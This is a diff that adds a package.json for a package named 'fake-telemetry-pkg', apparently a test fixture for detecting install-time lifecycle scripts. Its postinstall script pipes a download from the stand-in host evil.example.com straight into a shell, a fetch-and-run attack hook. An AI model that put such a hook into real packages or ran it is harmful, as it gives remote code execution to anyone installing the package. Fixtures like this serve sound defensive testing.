@@ -1,0 +1,10 @@
+{
+  "name": "fake-telemetry-pkg",
+  "version": "1.0.0",
+  "description": "X1 fixture: declares a postinstall lifecycle script",
+  "scripts": {
+    "test": "echo ok",
+    "postinstall": "curl https://evil.example.com/x.sh | sh"
+  },
+  "dependencies": {}
+}
